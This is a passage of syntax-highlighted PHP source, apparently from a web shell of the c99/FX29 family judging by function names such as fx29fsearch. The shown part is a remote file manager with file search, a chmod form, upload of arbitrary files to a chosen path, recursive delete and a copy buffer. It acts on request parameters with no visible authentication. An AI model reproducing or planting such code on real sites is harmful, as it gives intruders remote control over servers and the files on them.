          <span class="s2">&quot;text_cs&quot;</span>        <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">@</span><span class="nv">$search_text_cs</span><span class="p">,</span>
          <span class="s2">&quot;text_not&quot;</span>    <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">@</span><span class="nv">$search_text_not</span>
      <span class="p">);</span>
      <span class="nv">$searchtime</span> <span class="o">=</span> <span class="nx">getmicrotime</span><span class="p">();</span>
      <span class="nv">$in</span> <span class="o">=</span> <span class="nb">array_unique</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;;&quot;</span><span class="p">,</span><span class="nv">$search_in</span><span class="p">));</span>
      <span class="k">foreach</span><span class="p">(</span><span class="nv">$in</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> <span class="nx">fx29fsearch</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span> <span class="p">}</span>
      <span class="nv">$searchtime</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nx">getmicrotime</span><span class="p">()</span><span class="o">-</span><span class="nv">$searchtime</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$found</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;No files found!&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$ls_arr</span> <span class="o">=</span> <span class="nv">$found</span><span class="p">;</span>
        <span class="nv">$disp_fullpath</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
        <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">&amp;lt;form name=&quot;f_search&quot; method=&quot;POST&quot;&amp;gt;</span>
<span class="x">    &amp;lt;input type=&quot;hidden&quot; name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">    &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dspact</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">    &amp;lt;table class=&quot;contents&quot;&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;File or folder Name:&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;search_name&quot; size=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">round</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$search_name</span><span class="p">)</span><span class="o">+</span><span class="mi">25</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$search_name</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt; &amp;lt;input type=&quot;checkbox&quot; name=&quot;search_name_regexp&quot; value=&quot;1&quot; </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="p">(</span><span class="o">@</span><span class="nv">$search_name_regexp</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&amp;gt; Regular Expression&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Look in (Separate by &quot;;&quot;):&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;search_in&quot; size=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">round</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$search_in</span><span class="p">)</span><span class="o">+</span><span class="mi">25</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$search_in</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;A word or phrase in the file:&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&amp;lt;textarea name=&quot;search_text&quot; cols=&quot;50&quot; rows=&quot;5&quot;&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$search_text</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/textarea&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;checkbox&quot; name=&quot;search_text_regexp&quot; value=&quot;1&quot; </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="p">(</span><span class="o">@</span><span class="nv">$search_text_regexp</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&amp;gt; Regular Expression</span>
<span class="x">            &amp;lt;input type=&quot;checkbox&quot; name=&quot;search_text_wwo&quot; value=&quot;1&quot; </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="p">(</span><span class="o">@</span><span class="nv">$search_text_wwo</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&amp;gt; Whole words only</span>
<span class="x">            &amp;lt;input type=&quot;checkbox&quot; name=&quot;search_text_cs&quot; value=&quot;1&quot; </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="p">(</span><span class="o">@</span><span class="nv">$search_text_cs</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&amp;gt; Case sensitive</span>
<span class="x">            &amp;lt;input type=&quot;checkbox&quot; name=&quot;search_text_not&quot; value=&quot;1&quot; </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="p">(</span><span class="o">@</span><span class="nv">$search_text_not</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&amp;gt; Find files NOT containing the text</span>
<span class="x">        &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Search&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;/table&amp;gt;</span>
<span class="x">&amp;lt;/form&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;ls&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$dspact</span> <span class="o">=</span> <span class="nv">$act</span><span class="p">;</span>
      <span class="k">echo</span> <span class="nv">$searchtime</span><span class="o">.</span><span class="s2">&quot; secs (&quot;</span><span class="o">.</span><span class="nv">$search_i_f</span><span class="o">.</span><span class="s2">&quot; files and &quot;</span><span class="o">.</span><span class="nv">$search_i_d</span><span class="o">.</span><span class="s2">&quot; folders, &quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">((</span><span class="nv">$search_i_f</span><span class="o">+</span><span class="nv">$search_i_d</span><span class="p">)</span><span class="o">/</span><span class="nv">$searchtime</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; objects per second).&amp;lt;/b&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="c1">###[ CHMOD]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;chmod&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$mode</span> <span class="o">=</span> <span class="nb">fileperms</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$mode</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Change file-mode with error:&amp;lt;/b&amp;gt; can&#39;t get current value.&quot;</span><span class="p">;}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="nv">$form</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$chmod_submit</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$octet</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="o">.</span><span class="nb">base_convert</span><span class="p">((</span><span class="nv">$chmod_o</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_o</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_o</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_g</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_g</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_g</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_w</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_w</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_w</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$octet</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span> <span class="nv">$form</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span> <span class="nv">$err</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span><span class="nv">$err</span> <span class="o">=</span> <span class="s2">&quot;Can&#39;t chmod to &quot;</span><span class="o">.</span><span class="nv">$octet</span><span class="o">.</span><span class="s2">&quot;.&quot;</span><span class="p">;}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$form</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$perms</span> <span class="o">=</span> <span class="nx">parse_perms</span><span class="p">(</span><span class="nv">$mode</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Changing file-mode (&quot;</span><span class="o">.</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="s2">&quot;), &quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nb">decoct</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)),</span><span class="o">-</span><span class="mi">4</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)&amp;lt;/b&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$err</span><span class="o">?</span><span class="s2">&quot;&amp;lt;b&amp;gt;Error:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nv">$err</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;form name=</span><span class="se">\&quot;</span><span class="s2">f_chmod</span><span class="se">\&quot;</span><span class="s2"> action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> method=POST&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=hidden name=d value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=hidden name=f value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=hidden name=act value=chmod&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;table&amp;gt;&amp;lt;tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Owner&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=checkbox NAME=chmod_o[r] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;o&quot;</span><span class="p">][</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; Read&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=checkbox name=chmod_o[w] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;o&quot;</span><span class="p">][</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; Write&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=checkbox NAME=chmod_o[x] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;o&quot;</span><span class="p">][</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; eXecute&amp;lt;/td&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Group&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=checkbox NAME=chmod_g[r] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;g&quot;</span><span class="p">][</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; Read&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=checkbox NAME=chmod_g[w] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;g&quot;</span><span class="p">][</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; Write&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=checkbox NAME=chmod_g[x] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;g&quot;</span><span class="p">][</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; eXecute&amp;lt;/td&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;World&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=checkbox NAME=chmod_w[r] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">][</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; Read&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=checkbox NAME=chmod_w[w] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">][</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; Write&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=checkbox NAME=chmod_w[x] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">][</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; eXecute&amp;lt;/td&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit name=chmod_submit value=</span><span class="se">\&quot;</span><span class="s2">Save</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;/table&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;/form&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="c1">###[ UPLOAD ]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;upload&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$uploadmess</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
    <span class="nv">$uploadpath</span> <span class="o">=</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$uploadpath</span><span class="p">))</span> <span class="o">?</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$uploadpath</span><span class="p">)</span> <span class="o">:</span> <span class="nv">$d</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$uploadpath</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$uploadpath</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span> <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
      <span class="nv">$uploadfile</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&quot;uploadfile&quot;</span><span class="p">];</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$uploadfile</span><span class="p">[</span><span class="s2">&quot;tmp_name&quot;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$uploadfilename</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$destin</span> <span class="o">=</span> <span class="nv">$uploadfile</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span> <span class="nv">$destin</span> <span class="o">=</span> <span class="nv">$userfilename</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$uploadfile</span><span class="p">[</span><span class="s2">&quot;tmp_name&quot;</span><span class="p">],</span><span class="nv">$uploadpath</span><span class="o">.</span><span class="nv">$destin</span><span class="p">))</span> <span class="p">{</span>
          <span class="nv">$uploadmess</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;div class=errmsg&amp;gt;Error uploading file &quot;</span><span class="o">.</span><span class="nv">$uploadfile</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; (Can&#39;t copy </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$uploadfile</span><span class="p">[</span><span class="s2">&quot;tmp_name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> to </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$uploadpath</span><span class="o">.</span><span class="nv">$destin</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">!&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span> <span class="nv">$uploadmess</span> <span class="o">.=</span> <span class="s2">&quot;File uploaded successfully!&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$uploadpath</span><span class="o">.</span><span class="nv">$destin</span><span class="p">;</span> <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span> <span class="nv">$uploadmess</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;div class=errmsg&amp;gt;No file to upload!&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="nv">$uploadmess</span><span class="p">;</span>
    <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">###{ DELETE }###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;delete&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$delerr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$actbox</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$result</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
      <span class="nv">$result</span> <span class="o">=</span> <span class="nx">fs_rmobj</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$delerr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t delete &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$delerr</span><span class="p">))</span> <span class="p">{</span> <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;Error deleting:&amp;lt;br&amp;gt;</span><span class="si">$delerr</span><span class="s2">&quot;</span><span class="p">);</span> <span class="p">}</span>
    <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">###[ COPY ]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;copy&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$err</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
    <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">],</span><span class="nv">$actbox</span><span class="p">);</span>
    <span class="nx">fx29_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span>
